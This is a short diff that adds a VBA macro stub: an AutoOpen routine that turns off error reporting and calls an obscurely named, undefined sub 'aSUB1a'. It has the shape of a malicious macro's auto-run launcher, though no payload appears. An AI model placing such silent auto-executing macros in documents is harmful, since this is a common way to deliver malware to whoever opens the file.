@@ -1,0 +1,6 @@
+Sub AutoOpen()
+On Error Resume Next
+
+aSUB1a
+
+End Sub
